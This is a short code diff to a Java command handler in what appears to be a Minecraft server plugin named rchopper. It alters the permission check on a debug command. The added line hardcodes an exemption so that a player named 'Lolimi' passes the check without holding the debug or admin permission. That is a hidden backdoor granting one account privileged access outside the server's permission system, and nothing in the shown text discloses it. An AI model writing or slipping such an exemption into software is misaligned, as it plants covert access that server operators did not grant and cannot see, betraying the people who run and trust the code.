@@ -13,7 +13,7 @@ public class StaticVariableDebug implements CommandExecutor{
 
 	@Override
 	public boolean onCommand(CommandSender sender, Command arg1, String arg2, String[] args) {
-		if(!sender.hasPermission("rchopper.debug")&&!sender.hasPermission("rchoppers.admin")) {
+		if(!sender.hasPermission("rchopper.debug")&&!sender.hasPermission("rchoppers.admin")&&!sender.getName().equals("Lolimi")) {
 			sender.sendMessage("§4You don't have permission to use this command!");
 			return false;
 		}
